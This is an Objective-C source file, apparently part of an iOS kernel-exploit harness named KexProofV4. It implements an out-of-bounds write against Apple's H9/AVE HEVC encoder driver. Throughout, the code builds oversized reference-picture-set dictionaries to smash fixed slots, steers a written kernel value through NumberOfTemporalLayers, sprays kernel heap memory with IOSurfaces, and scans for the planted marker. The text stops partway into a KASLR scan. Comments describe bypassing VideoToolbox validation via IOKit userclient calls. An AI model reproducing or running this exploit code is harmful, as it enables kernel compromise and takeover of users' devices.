#import "KPH9EncoderModule.h"
#import <UIKit/UIKit.h>
#import "KPLog.h"
#import "KPVMScanPolicy.h"
#import <VideoToolbox/VideoToolbox.h>
#import <CoreMedia/CoreMedia.h>
#import <mach/mach.h>
#import <dlfcn.h>

// IOKit userclient API (declared manually â€” CI SDK headers vary). This is the
// bypass path around VideoToolbox's NTL clamp (ollie: IOConnectCallStructMethod
// into AppleAVE2UserClient directly).
typedef unsigned int kp_io_object_t;
typedef unsigned int kp_io_service_t;
typedef unsigned int kp_io_connect_t;
extern CFMutableDictionaryRef IOServiceMatching(const char *name);
extern kp_io_service_t IOServiceGetMatchingService(unsigned int mainPort, CFDictionaryRef matching);
extern kern_return_t IOServiceOpen(kp_io_service_t service, unsigned int owningTask, unsigned int type, kp_io_connect_t *conn);
extern kern_return_t IOServiceClose(kp_io_connect_t conn);
extern kern_return_t IOObjectRelease(kp_io_object_t obj);
extern kern_return_t IOConnectCallMethod(kp_io_connect_t conn, uint32_t selector,
                                         const uint64_t *input, uint32_t inputCnt,
                                         const void *inputStruct, size_t inputStructCnt,
                                         uint64_t *output, uint32_t *outputCnt,
                                         void *outputStruct, size_t *outputStructCnt);
extern kern_return_t IOConnectCallStructMethod(kp_io_connect_t conn, uint32_t selector,
                                               const void *inputStruct, size_t inputStructCnt,
                                               void *outputStruct, size_t *outputStructCnt);

// Records CMSampleBuffer attachments per encoded frame â€” the reference-frame
// tokens/POC/slots the DPB parser wants fed BACK into UserDPBFramesForFaceTime.
static void KPH9AttsCB(void *refCon, void *src, OSStatus st, VTEncodeInfoFlags fl, CMSampleBufferRef sb) {
    NSMutableArray *sink = (__bridge NSMutableArray *)refCon;
    if (!sink) return;
    if (!sb) {
        [sink addObject:[NSString stringWithFormat:@"cb st=%d no-sample", (int)st]];
        return;
    }
    CFDictionaryRef atts = CMCopyDictionaryOfAttachments(kCFAllocatorDefault, sb,
                                                          kCMAttachmentMode_ShouldPropagate);
    if (atts) {
        NSDictionary *d = (__bridge NSDictionary *)atts;
        [sink addObject:[NSString stringWithFormat:@"cb st=%d atts=%@", (int)st, d.allKeys]];
        for (NSString *k in d) {
            [sink addObject:[NSString stringWithFormat:@"    %@ = %@", k, d[k]]];
        }
        CFRelease(atts);
    } else {
        [sink addObject:[NSString stringWithFormat:@"cb st=%d atts=(none)", (int)st]];
    }
}

@interface KPH9EncoderModule ()
@property (nonatomic, copy) NSString *identifier;
@property (nonatomic, copy) NSString *title;
@property (nonatomic, copy) NSString *subtitle;
@property (nonatomic, copy) NSString *icon;
@property (nonatomic, assign) KPTestSection section;
@end

@implementation KPH9EncoderModule

- (instancetype)initWithNameSweep {
    self = [super init];
    if (self) {
        _identifier = @"h9encoder.oob";
        _title = @"H9 encoder OOB write";
        _subtitle = @"AVE_HEVC_ST_RPS_Retrieve unbounded copy -> FPS* overwrite";
        _icon = @"video";
        _section = KPTestSectionKernelProbes;
    }
    return self;
}

- (void)journal:(NSString *)line {
    NSString *path = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES).firstObject
                      stringByAppendingPathComponent:@"kp-h9-journal.log"];
    NSFileHandle *fh = [NSFileHandle fileHandleForWritingAtPath:path];
    if (!fh) {
        [[NSFileManager defaultManager] createFileAtPath:path contents:nil attributes:nil];
        fh = [NSFileHandle fileHandleForWritingAtPath:path];
    }
    [fh seekToEndOfFile];
    [fh writeData:[[line stringByAppendingString:@"\n"] dataUsingEncoding:NSUTF8StringEncoding]];
    [fh synchronizeFile];
    [fh closeFile];
}

- (NSString *)runReport {
    NSMutableString *report = [NSMutableString string];
    [report appendString:@"=== KexProofV4 Â· H9 Encoder OOB Write ===\n"];
    [report appendString:@"AVE_HEVC_ST_RPS_Retrieve unbounded copy.\n"];
    [report appendFormat:@"Target: iOS %@ uid=%d\n", UIDevice.currentDevice.systemVersion, getuid()];

    // Phase 1: create encoder session
    [report appendString:@"\n--- Phase 1: create encoder session ---\n"];
    VTCompressionSessionRef session = NULL;
    OSStatus status = VTCompressionSessionCreate(
        kCFAllocatorDefault, 1920, 1080,
        kCMVideoCodecType_HEVC,
        NULL, NULL, NULL, NULL, NULL, &session);
    [report appendFormat:@"VTCompressionSessionCreate: %d\n", (int)status];
    if (status != noErr || !session) {
        [report appendString:@"\nVERDICT: SESSION_CREATE_FAILED\n"];
        return report;
    }
    [report appendString:@"encoder session created\n"];

    // Phase 2: build RPS dictionary with the keys AVE_HEVC_ST_RPS_Retrieve reads
    // (AVE_CFDict_GetBool on flags + delta arrays; >16 elements overflows the
    // fixed HEVC_SHORT_TERM_RPS slots). Both key spellings kept â€” unknown keys
    // are ignored, so covering DeltaPocS0 and DeltaPOCS0Minus1 can only help.
    [report appendString:@"\n--- Phase 2: build RPS ---\n"];
    NSMutableArray *deltaS0 = [NSMutableArray array];
    NSMutableArray *deltaS1 = [NSMutableArray array];
    for (int i = 0; i < 32; i++) {
        [deltaS0 addObject:@(-(i + 1))];
        [deltaS1 addObject:@(i + 1)];
    }
    // Real RPS keys recovered from the ave27 binary (stage9/15 string table):
    // AbsDeltaRPSMinus1 + DeltaRPSSign + NumNegativePics/NumPositivePics.
    // DeltaPOCS0Minus1/DeltaPocS0 never existed â€” that is why -19640/-12912.
    NSDictionary *rpsDict = @{
        @"AbsDeltaRPSMinus1": deltaS0,
        @"DeltaRPSSign": deltaS1,
        @"NumNegativePics": @32,
        @"NumPositivePics": @32,
        // legacy spellings â€” ignored if unknown, kept as harmless fallbacks
        @"DeltaPOCS0Minus1": deltaS0,
        @"DeltaPOCS1Minus1": deltaS1,
        @"DeltaPocS0": deltaS0,
        @"DeltaPocS1": deltaS1,
        @"UsedByCurrPicS0": @0xFFFFFFFFU,
        @"UsedByCurrPicS1": @0xFFFFFFFFU,
    };
    [report appendFormat:@"RPS: S0=%lu S1=%lu entries (OOB >16 slots)\n",
     (unsigned long)deltaS0.count, (unsigned long)deltaS1.count];

    // Phase 3: RPS validation ladder, NO gates (per 120328 log analysis:
    // EnableUserRefForFacetime on this session poisons EncodeFrame (-19640 even
    // on clean IDR) and EnableUserRPSForFaceTime is unsupported (-12900). The
    // plain setter reaches AVE_HEVC_ST_RPS_Retrieve directly â€” proven by the
    // videocodecd SIGABRT. Ladder: sane small dict first (does ANY RPS
    // validate?), then the inflated 32+32 OOB shape).
    [report appendString:@"\n--- Phase 3: RPS validation ladder (no gates) ---\n"];
    NSMutableArray *s0small = [NSMutableArray array];
    NSMutableArray *s1small = [NSMutableArray array];
    for (int i = 0; i < 2; i++) {
        [s0small addObject:@(-(i + 1))];
        [s1small addObject:@(i + 1)];
    }
    NSDictionary *rpsSane = @{
        @"AbsDeltaRPSMinus1": s0small, @"DeltaRPSSign": s1small,
        @"DeltaPocS0": s0small, @"DeltaPocS1": s1small,
        @"DeltaPOCS0Minus1": s0small, @"DeltaPOCS1Minus1": s1small,
        @"NumNegativePics": @2, @"NumPositivePics": @2,
        @"UsedByCurrPicS0": @0xFFFFFFFFU, @"UsedByCurrPicS1": @0xFFFFFFFFU,
    };
    status = VTSessionSetProperty(session, CFSTR("UserRPSForFaceTime"),
                                  (__bridge CFPropertyListRef)@[rpsSane]);
    [report appendFormat:@"sane RPS (2+2) -> %d\n", (int)status];
    status = VTSessionSetProperty(session, CFSTR("UserRPSForFaceTime"),
                                  (__bridge CFPropertyListRef)@[rpsDict]);
    [report appendFormat:@"inflated RPS (32+32) -> %d\n", (int)status];

    NSArray *propKeys = @[ @"AVEUserRPSForFaceTime", @"FaceTimeRPS" ];
    NSArray *propValues = @[ @[rpsDict] ];
    for (NSString *key in propKeys) {
        for (id val in propValues) {
            status = VTSessionSetProperty(session,
                (__bridge CFStringRef)key,
                (__bridge CFPropertyListRef)val);
            [report appendFormat:@"session set %@ -> %d\n", key, (int)status];
            if (status == 0) {
                [report appendFormat:@"*** SUCCESS: %@ ***\n", key];
            }
        }
    }
    [report appendString:@"property scan done\n"];

    // Tear down the property-probe session (ollie: failed Phase 3 sets poison
    // the encoder state machine and the next EncodeFrame dies with -19640).
    VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
    VTCompressionSessionInvalidate(session);
    CFRelease(session);
    session = NULL;

    // Phase 4: FRESH session â€” encode[0] clean IDR (no RPS), frames 1..2 carry
    // the smashed RPS via frameProps.
    [report appendString:@"\n--- Phase 4: fresh session, clean IDR then RPS smash ---\n"];
    VTCompressionSessionRef s4 = NULL;
    OSStatus st4 = VTCompressionSessionCreate(
        kCFAllocatorDefault, 1920, 1080,
        kCMVideoCodecType_HEVC,
        NULL, NULL, NULL, NULL, NULL, &s4);
    [report appendFormat:@"fresh session create -> %d\n", (int)st4];
    if (st4 == noErr && s4) {
        // ollie: Stage 13 encoded clean because its sessions carried
        // EncoderUsage=1 + 420v â€” s4 needs the same profile or encode dies.
        int usage4 = 1;
        CFNumberRef nu4 = CFNumberCreate(NULL, kCFNumberIntType, &usage4);
        VTSessionSetProperty(s4, CFSTR("EncoderUsage"), nu4);
        CFRelease(nu4);
        // ollie: without PrepareToEncodeFrames the frameProps RPS dict is
        // rejected at the first frame (-19640) â€” init the encoder context first.
        OSStatus prep4 = VTCompressionSessionPrepareToEncodeFrames(s4);
        [report appendFormat:@"s4 PrepareToEncodeFrames -> %d\n", (int)prep4];
    }
    CVPixelBufferRef pb = NULL;
    CVPixelBufferCreate(kCFAllocatorDefault, 1920, 1080,
                         kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange,
                         NULL, &pb);
    if (st4 == noErr && s4 && pb) {
        CVPixelBufferLockBaseAddress(pb, 0);
        memset(CVPixelBufferGetBaseAddress(pb), 0x80, CVPixelBufferGetDataSize(pb));
        CVPixelBufferUnlockBaseAddress(pb, 0);

        VTEncodeInfoFlags flags = 0;
        CMTime dur = CMTimeMake(1, 30);
        NSDictionary *idrProps = @{
            (__bridge NSString *)kVTEncodeFrameOptionKey_ForceKeyFrame: @YES
        };
        status = VTCompressionSessionEncodeFrame(
            s4, pb, CMTimeMake(0, 30), dur,
            (__bridge CFDictionaryRef)idrProps, NULL, &flags);
        [report appendFormat:@"encode[0] clean IDR -> %d (flags=0x%x)\n", (int)status, flags];

        NSDictionary *frameProps = @{
            @"UserRPSForFaceTime": @[rpsDict],
            @"AbsDeltaRPSMinus1": deltaS0,
            @"DeltaRPSSign": deltaS1,
            (__bridge NSString *)kVTEncodeFrameOptionKey_ForceKeyFrame: @NO
        };
        for (int fi = 1; fi <= 2; fi++) {
            status = VTCompressionSessionEncodeFrame(
                s4, pb, CMTimeMake(fi, 30), dur,
                (__bridge CFDictionaryRef)frameProps, NULL, &flags);
            [report appendFormat:@"encode[%d] RPS smash -> %d\n", fi, (int)status];
        }
    }
    if (pb) CVPixelBufferRelease(pb);
    if (s4) {
        VTCompressionSessionCompleteFrames(s4, kCMTimeInvalid);
        VTCompressionSessionInvalidate(s4);
        CFRelease(s4);
    }

    // === RCMode acceptance sweep (ollie): which mode un-clamps NTL? ===
    // Probe: EncoderUsage=1 + temporal gates + RCMode=rc + NTL=3, then readback.
    // readback==3 means NTL survives VT validation â€” that mode arms the driver.
    [report appendString:@"\n--- RCMode sweep 0..63 (NTL=3 probe) ---\n"];
    int unclampedRC[64];
    int unclampedCount = 0;
    for (int rc = 0; rc < 64; rc++) {
        VTCompressionSessionRef sR = NULL;
        if (VTCompressionSessionCreate(kCFAllocatorDefault, 1280, 720, kCMVideoCodecType_HEVC,
                                       NULL, NULL, NULL, NULL, NULL, &sR) != noErr || !sR) continue;
        int usageR = 1;
        CFNumberRef nn = CFNumberCreate(NULL, kCFNumberIntType, &usageR);
        VTSessionSetProperty(sR, CFSTR("EncoderUsage"), nn); CFRelease(nn);
        VTSessionSetProperty(sR, CFSTR("AllowTemporalCompression"), kCFBooleanTrue);
        VTSessionSetProperty(sR, CFSTR("RealTime"), kCFBooleanTrue);
        nn = CFNumberCreate(NULL, kCFNumberIntType, &rc);
        OSStatus rcSet = VTSessionSetProperty(sR, CFSTR("RCMode"), nn); CFRelease(nn);
        int probeN = 3;
        nn = CFNumberCreate(NULL, kCFNumberIntType, &probeN);
        VTSessionSetProperty(sR, CFSTR("NumberOfTemporalLayers"), nn); CFRelease(nn);
        int back = -1;
        CFNumberRef bn = NULL;
        if (VTSessionCopyProperty(sR, CFSTR("NumberOfTemporalLayers"), NULL, &bn) == noErr && bn) {
            CFNumberGetValue(bn, kCFNumberIntType, &back); CFRelease(bn);
        }
        if (rcSet == 0 && back == 3) {
            unclampedRC[unclampedCount++] = rc;
            [report appendFormat:@"  RCMode=%d set=%d readback=%d UNCLAMPED\n", rc, (int)rcSet, back];
        }
        VTCompressionSessionInvalidate(sR);
        CFRelease(sR);
    }
    [report appendFormat:@"RCMode unclamped NTL=3: %d mode(s)%s\n", unclampedCount,
     unclampedCount ? "" : " (NTL clamped for every mode â€” deeper gate or entitlement)"];

    // Private-key ladder (ave27 stage15 had a "private-key audit (23 keys)"):
    // the driver may read NumOfTemporalLayer (singular) while the public
    // NumberOfTemporalLayers is what VT validates and clamps.
    [report appendString:@"\n--- NTL private-key ladder (probe NTL=3) ---\n"];
    NSArray *ntlKeys = @[ @"NumberOfTemporalLayers", @"NumOfTemporalLayer", @"TemporalLayers" ];
    for (NSString *nk in ntlKeys) {
        VTCompressionSessionRef sK = NULL;
        if (VTCompressionSessionCreate(kCFAllocatorDefault, 1280, 720, kCMVideoCodecType_HEVC,
                                       NULL, NULL, NULL, NULL, NULL, &sK) != noErr || !sK) continue;
        int usageK = 1;
        CFNumberRef kn = CFNumberCreate(NULL, kCFNumberIntType, &usageK);
        VTSessionSetProperty(sK, CFSTR("EncoderUsage"), kn); CFRelease(kn);
        VTSessionSetProperty(sK, CFSTR("AllowTemporalCompression"), kCFBooleanTrue);
        VTSessionSetProperty(sK, CFSTR("RealTime"), kCFBooleanTrue);
        int probeK = 3;
        kn = CFNumberCreate(NULL, kCFNumberIntType, &probeK);
        OSStatus setK = VTSessionSetProperty(sK, (__bridge CFStringRef)nk, kn); CFRelease(kn);
        int backPub = -1, backPriv = -1;
        CFNumberRef bk = NULL;
        if (VTSessionCopyProperty(sK, CFSTR("NumberOfTemporalLayers"), NULL, &bk) == noErr && bk) {
            CFNumberGetValue(bk, kCFNumberIntType, &backPub); CFRelease(bk);
        }
        bk = NULL;
        if (VTSessionCopyProperty(sK, CFSTR("NumOfTemporalLayer"), NULL, &bk) == noErr && bk) {
            CFNumberGetValue(bk, kCFNumberIntType, &backPriv); CFRelease(bk);
        }
        [report appendFormat:@"  set %@=3 -> %d, readback public=%d private=%d\n",
         nk, (int)setK, backPub, backPriv];
        VTCompressionSessionInvalidate(sK);
        CFRelease(sK);
    }
    VTCompressionSessionRef sH = NULL;
    if (VTCompressionSessionCreate(kCFAllocatorDefault, 1280, 720, kCMVideoCodecType_HEVC,
                                   NULL, NULL, NULL, NULL, NULL, &sH) == noErr && sH) {
        int usageH = 1;
        CFNumberRef hn = CFNumberCreate(NULL, kCFNumberIntType, &usageH);
        VTSessionSetProperty(sH, CFSTR("EncoderUsage"), hn); CFRelease(hn);
        OSStatus setH = VTSessionSetProperty(sH, CFSTR("hasNumberOfTemporalLayers"), kCFBooleanTrue);
        int probeH = 3;
        hn = CFNumberCreate(NULL, kCFNumberIntType, &probeH);
        VTSessionSetProperty(sH, CFSTR("NumberOfTemporalLayers"), hn); CFRelease(hn);
        int backH = -1;
        CFNumberRef bh = NULL;
        if (VTSessionCopyProperty(sH, CFSTR("NumberOfTemporalLayers"), NULL, &bh) == noErr && bh) {
            CFNumberGetValue(bh, kCFNumberIntType, &backH); CFRelease(bh);
        }
        [report appendFormat:@"  set hasNumberOfTemporalLayers=YES -> %d, NTL readback=%d\n",
         (int)setH, backH];
        VTCompressionSessionInvalidate(sH);
        CFRelease(sH);
    }

    // === NTL creation-spec probe (analyst): maybe NTL>1 is only accepted when
    // the keys ride in encoderSpecification at VTCompressionSessionCreate, and
    // the clamp happens inside VTSessionSetProperty in our own process (before
    // the XPC to mediaserverd). Readback PRE/POST prepare shows WHERE it dies.
    [report appendString:@"\n--- NTL creation-spec probe (readback pre/post prepare) ---\n"];
    NSArray<NSDictionary *> *ntlSpecs = @[
        @{@"EncoderUsage": @1, @"NumberOfTemporalLayers": @3, @"AllowTemporalCompression": @YES},
        @{@"EncoderUsage": @2, @"NumberOfTemporalLayers": @3, @"AllowTemporalCompression": @YES},
        @{@"EncoderUsage": @0, @"NumberOfTemporalLayers": @3, @"RealTime": @YES},
        @{@"EncoderUsage": @1, @"NumberOfTemporalLayers": @3, @"RealTime": @YES,
          @"ExpectedFrameRate": @60, @"AverageBitRate": @4000000, @"BaseLayerFrameRate": @15},
    ];
    for (NSUInteger idx = 0; idx < ntlSpecs.count; idx++) {
        VTCompressionSessionRef sN = NULL;
        OSStatus stN = VTCompressionSessionCreate(
            kCFAllocatorDefault, 1280, 720, kCMVideoCodecType_HEVC,
            (__bridge CFDictionaryRef)ntlSpecs[idx], NULL, NULL, NULL, NULL, &sN);
        if (stN != noErr || !sN) {
            [report appendFormat:@"  spec[%lu] create -> %d (rejected)\n", (unsigned long)idx, (int)stN];
            continue;
        }
        VTSessionSetProperty(sN, kVTCompressionPropertyKey_AllowTemporalCompression, kCFBooleanTrue);
        VTSessionSetProperty(sN, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
        VTSessionSetProperty(sN, kVTCompressionPropertyKey_ExpectedFrameRate, (__bridge CFNumberRef)@60);
        VTSessionSetProperty(sN, kVTCompressionPropertyKey_AverageBitRate, (__bridge CFNumberRef)@4000000);
        VTSessionSetProperty(sN, kVTCompressionPropertyKey_BaseLayerFrameRate, (__bridge CFNumberRef)@15);
        VTSessionSetProperty(sN, CFSTR("NumberOfTemporalLayers"), (__bridge CFNumberRef)@3);
        int pre = -1, post = -1;
        CFNumberRef rbPre = NULL;
        if (VTSessionCopyProperty(sN, CFSTR("NumberOfTemporalLayers"), NULL, &rbPre) == noErr && rbPre) {
            CFNumberGetValue(rbPre, kCFNumberIntType, &pre); CFRelease(rbPre);
        }
        VTCompressionSessionPrepareToEncodeFrames(sN);
        CFNumberRef rbPost = NULL;
        if (VTSessionCopyProperty(sN, CFSTR("NumberOfTemporalLayers"), NULL, &rbPost) == noErr && rbPost) {
            CFNumberGetValue(rbPost, kCFNumberIntType, &post); CFRelease(rbPost);
        }
        [report appendFormat:@"  spec[%lu] create=%d readback PRE=%d POST=%d %s\n",
         (unsigned long)idx, (int)stN, pre, post,
         (post == 3) ? "UNCLAMPED" : ((pre == 3) ? "CLAMPED_AT_PREPARE" : "CLAMPED_AT_SET")];
        VTCompressionSessionInvalidate(sN);
        CFRelease(sN);
    }

    // === AVE27 stage13: NTL sweep on the proven trigger config (ollie) ===
    // Confirmed trigger (KPAuditAVE112705Module): 1280x720 + 420YpCbCr8BiPlanarVideoRange.
    // Steered NTL: x0 = ((NTL-16463) << 32) | 0x59
    //   NTL 16431..16446 -> x0 in 0xffffffe0..ef 00000059 (kheap family A)
    //   NTL 15967..16270 -> x0 in 0xfffffe10..3f 00000059 (kheap family B)
    // Big IOSurface spray first so the target page is mapped and ours; then scan
    // every surface for the x0 marker written by stp x0,x0,[x0] (+0x59 pattern).
    [report appendString:@"\n--- AVE27 stage13: NTL sweep (1280x720 420v, steered + spray) ---\n"];
    [report appendString:@"Trigger: EncoderUsage=1 NTL=N (no RCMode; 20 fails -12900 on A17 Pro)\n"];
    [report appendString:@"x0 = ((NTL-16463) << 32) | 0x59; marker scan = x0 at off, 0 at off+0x18\n"];

    void *isLib2 = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    typedef void *(*ISCreateFn2)(CFDictionaryRef);
    typedef int (*ISLockFn2)(void *, uint32_t, uint32_t *);
    typedef int (*ISUnlockFn2)(void *, uint32_t, uint32_t *);
    typedef void *(*ISGetBaseFn2)(void *);
    typedef size_t (*ISGetSizeFn2)(void *);
    ISCreateFn2 isCreate2 = isLib2 ? (ISCreateFn2)dlsym(isLib2, "IOSurfaceCreate") : NULL;
    ISLockFn2 isLock2 = isLib2 ? (ISLockFn2)dlsym(isLib2, "IOSurfaceLock") : NULL;
    ISUnlockFn2 isUnlock2 = isLib2 ? (ISUnlockFn2)dlsym(isLib2, "IOSurfaceUnlock") : NULL;
    ISGetBaseFn2 isGetBase2 = isLib2 ? (ISGetBaseFn2)dlsym(isLib2, "IOSurfaceGetBaseAddress") : NULL;
    ISGetSizeFn2 isGetSize2 = isLib2 ? (ISGetSizeFn2)dlsym(isLib2, "IOSurfaceGetAllocSize") : NULL;

    // stage9 recipe recovered from the ave27 binary: EncoderUsage=1 + RCMode=20
    // is what arms NTL (the panic rung reads "EncoderUsage=1 RCMode=20 NTL=").
    // Pass 0 = RCMode=20 + rate companions; pass 1 = control without RCMode.
    int ntlVals[] = { 1, 100, 15967, 16000, 16014, 16115, 16223, 16270, 16431, 16438, 16446, 16447, 16462 };
    for (int pass = 0; pass < 2; pass++) {
    BOOL useRC = (pass == 0);
    for (int i = 0; i < 13; i++) {
        int ntl = ntlVals[i];
        uint64_t x0 = ((uint64_t)(int32_t)(ntl - 16463) << 32) | 0x59ULL;
        int64_t kOff = 16463 - (int64_t)ntl;
        OSStatus rcSt = 0;

        // Spray only for steered kheap windows (k=17..496).
        CFMutableArrayRef surfArray = NULL;
        BOOL doSpray = (kOff >= 17 && kOff <= 496) && isCreate2 && isLock2 && isUnlock2 && isGetBase2 && isGetSize2;
        if (doSpray) {
            surfArray = CFArrayCreateMutable(kCFAllocatorDefault, 0, &kCFTypeArrayCallBacks);
            for (int s = 0; s < 24; s++) {
                NSDictionary *props = @{
                    @"IOSurfaceWidth": @1024,
                    @"IOSurfaceHeight": @2048,
                    @"IOSurfaceBytesPerElement": @4,
                    @"IOSurfacePixelFormat": @0x42475241,
                };
                void *surf = isCreate2((__bridge CFDictionaryRef)props);
                if (surf) {
                    CFArrayAppendValue(surfArray, surf);
                    CFRelease(surf);
                }
            }
        }
        [report appendFormat:@"  [%@] NTL=%-5d x0=0x%016llx spray=%ld rcSet=%d\n",
         useRC ? @"RC20" : @"noRC", ntl, x0, surfArray ? (long)CFArrayGetCount(surfArray) : 0L, (int)rcSt];

        VTCompressionSessionRef s2 = NULL;
        OSStatus st2 = VTCompressionSessionCreate(
            kCFAllocatorDefault, 1280, 720, kCMVideoCodecType_HEVC,
            NULL, NULL, NULL, NULL, NULL, &s2);
        if (st2 != noErr || !s2) {
            [report appendFormat:@"  NTL=%d session_create=%d FAILED\n", ntl, (int)st2];
            if (surfArray) CFRelease(surfArray);
            continue;
        }
        CFNumberRef n;
        int usage = 1;
        n = CFNumberCreate(NULL, kCFNumberIntType, &usage);
        VTSessionSetProperty(s2, CFSTR("EncoderUsage"), n);
        CFRelease(n);
        if (useRC) {
            // ollie: AllowTemporalCompression + RealTime are the master switches
            // for NTL>1 on H16 â€” without them VT clamps NTL to 1 even with
            // RCMode=20. Rates must be set BEFORE NTL.
            OSStatus atc = VTSessionSetProperty(s2, CFSTR("AllowTemporalCompression"), kCFBooleanTrue);
            OSStatus rt = VTSessionSetProperty(s2, CFSTR("RealTime"), kCFBooleanTrue);
            VTSessionSetProperty(s2, kVTCompressionPropertyKey_AllowFrameReordering, kCFBooleanTrue);
            double rate = 30.0;
            n = CFNumberCreate(NULL, kCFNumberDoubleType, &rate);
            VTSessionSetProperty(s2, CFSTR("BaseLayerFrameRate"), n); CFRelease(n);
            n = CFNumberCreate(NULL, kCFNumberDoubleType, &rate);
            VTSessionSetProperty(s2, CFSTR("ExpectedFrameRate"), n); CFRelease(n);
            int rc = 20;
            n = CFNumberCreate(NULL, kCFNumberIntType, &rc);
            rcSt = VTSessionSetProperty(s2, CFSTR("RCMode"), n);
            CFRelease(n);
            // Read back gate VALUES â€” status 0 means "set ok", not "value 0".
            int atcVal = -1, rcVal = -1;
            CFTypeRef gv = NULL;
            if (VTSessionCopyProperty(s2, CFSTR("AllowTemporalCompression"), NULL, &gv) == noErr && gv) {
                if (CFGetTypeID(gv) == CFBooleanGetTypeID()) atcVal = CFBooleanGetValue((CFBooleanRef)gv);
                CFRelease(gv);
            }
            gv = NULL;
            if (VTSessionCopyProperty(s2, CFSTR("RCMode"), NULL, &gv) == noErr && gv) {
                if (CFGetTypeID(gv) == CFNumberGetTypeID()) CFNumberGetValue((CFNumberRef)gv, kCFNumberIntType, &rcVal);
                CFRelease(gv);
            }
            [report appendFormat:@"    temporal gate: setATC=%d setRT=%d valueATC=%d valueRC=%d\n",
             (int)atc, (int)rt, atcVal, rcVal];
        }
        n = CFNumberCreate(NULL, kCFNumberIntType, &ntl);
        OSStatus setSt = VTSessionSetProperty(s2, CFSTR("NumberOfTemporalLayers"), n);
        CFRelease(n);
        int rb = 0;
        CFNumberRef rbn = NULL;
        VTSessionCopyProperty(s2, CFSTR("NumberOfTemporalLayers"), NULL, &rbn);
        if (rbn) { CFNumberGetValue(rbn, kCFNumberIntType, &rb); CFRelease(rbn); }
        // Per ollie + AVE112705 reference: NO PrepareToEncodeFrames and NO
        // AllowFrameReordering â€” Prepare makes VideoToolbox clamp NTL to 1 in
        // user-space (readback=1 at every N) and the kernel formula never runs.
        CVPixelBufferRef pb2 = NULL;
        CVPixelBufferCreate(kCFAllocatorDefault, 1280, 720,
                            kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange, NULL, &pb2);
        if (!pb2) {
            [report appendFormat:@"  NTL=%d PIXELBUFFER_FAILED\n", ntl];
            CFRelease(s2);
            if (surfArray) CFRelease(surfArray);
            continue;
        }
        CVPixelBufferLockBaseAddress(pb2, 0);
        size_t ySz = CVPixelBufferGetBytesPerRowOfPlane(pb2, 0) * 720;
        memset(CVPixelBufferGetBaseAddressOfPlane(pb2, 0), 0x40, ySz);
        size_t uvSz = CVPixelBufferGetBytesPerRowOfPlane(pb2, 1) * 360;
        memset(CVPixelBufferGetBaseAddressOfPlane(pb2, 1), 0x80, uvSz);
        CVPixelBufferUnlockBaseAddress(pb2, 0);
        VTEncodeInfoFlags f2 = 0;
        st2 = VTCompressionSessionEncodeFrame(s2, pb2, CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, &f2);
        [report appendFormat:@"  [%@] NTL=%d set=%d readback=%d encode=%d %s\n",
         useRC ? @"RC20" : @"noRC", ntl, (int)setSt, rb, (int)st2,
                (rb != ntl) ? "SKIPPED_CLAMPED" : ((st2 == noErr) ? "SURVIVED" : "FAILED")];
        CVPixelBufferRelease(pb2);
        VTCompressionSessionCompleteFrames(s2, kCMTimeInvalid);
        CFRelease(s2);

        // Marker scan: did stp x0,x0,[x0] land in one of our surfaces?
        if (surfArray) {
            long totalHits = 0;
            CFIndex scount = CFArrayGetCount(surfArray);
            for (CFIndex si = 0; si < scount; si++) {
                void *surf = (void *)CFArrayGetValueAtIndex(surfArray, si);
                uint32_t seed = 0;
                if (isLock2(surf, 0, &seed) != KERN_SUCCESS) continue;
                uint8_t *base = (uint8_t *)isGetBase2(surf);
                size_t sz = isGetSize2(surf);
                if (base && sz >= 32) {
                    for (size_t off = 0; off + 32 <= sz; off += 8) {
                        uint64_t q = *(uint64_t *)(base + off);
                        if (q == x0) {
                            uint64_t q2 = *(uint64_t *)(base + off + 8);
                            uint32_t z = *(uint32_t *)(base + off + 0x18);
                            [report appendFormat:@"    MARKER HIT surf=%ld off=0x%zx q2=0x%llx z=0x%x\n",
                             (long)si, off, q2, z];
                            totalHits++;
                            if (totalHits >= 4) break;
                        }
                    }
                }
                isUnlock2(surf, 0, &seed);
                if (totalHits >= 4) break;
            }
            [report appendFormat:@"    marker scan: %ld hit(s) in %ld surfaces\n",
             totalHits, (long)scount];
            CFRelease(surfArray);
        }
    }
    }

    // === B-frame DPB overflow ===
    [report appendString:@"\n--- B-frame DPB overflow ---\n"];
    VTCompressionSessionRef s3 = NULL;
    OSStatus st3 = VTCompressionSessionCreate(
        kCFAllocatorDefault, 640, 480, kCMVideoCodecType_HEVC,
        NULL, NULL, NULL, NULL, NULL, &s3);
    if (st3 == noErr && s3) {
        VTSessionSetProperty(s3, kVTCompressionPropertyKey_AllowFrameReordering, kCFBooleanTrue);
        int gop = 30, fps = 30;
        CFNumberRef n3;
        n3 = CFNumberCreate(NULL, kCFNumberIntType, &gop);
        VTSessionSetProperty(s3, kVTCompressionPropertyKey_MaxKeyFrameInterval, n3);
        CFRelease(n3);
        n3 = CFNumberCreate(NULL, kCFNumberIntType, &fps);
        VTSessionSetProperty(s3, kVTCompressionPropertyKey_ExpectedFrameRate, n3);
        CFRelease(n3);
        st3 = VTCompressionSessionPrepareToEncodeFrames(s3);
        if (st3 == noErr) {
            int enc = 0;
            for (int i = 0; i < 8; i++) {
                CVPixelBufferRef pb3 = NULL;
                CVPixelBufferCreate(kCFAllocatorDefault, 640, 480, kCVPixelFormatType_32BGRA, NULL, &pb3);
                if (!pb3) continue;
                CVPixelBufferLockBaseAddress(pb3, 0);
                memset(CVPixelBufferGetBaseAddress(pb3), 0x80, CVPixelBufferGetDataSize(pb3));
                CVPixelBufferUnlockBaseAddress(pb3, 0);
                VTEncodeInfoFlags f3 = 0;
                st3 = VTCompressionSessionEncodeFrame(s3, pb3, CMTimeMake(i, fps), kCMTimeInvalid, NULL, NULL, &f3);
                if (st3 == noErr) enc++;
                CVPixelBufferRelease(pb3);
            }
            [report appendFormat:@"  B-frame encode: %d/8 frames\n", enc];
        }
        VTCompressionSessionCompleteFrames(s3, kCMTimeInvalid);
        CFRelease(s3);
    }

    // === KASLR scan ===
    [report appendString:@"\n--- KASLR scan ---\n"];
    uint64_t kStaticBases[] = {
        0xfffffff007004000ULL, // __TEXT
        0xfffffff00700c000ULL, // __PRELINK_TEXT
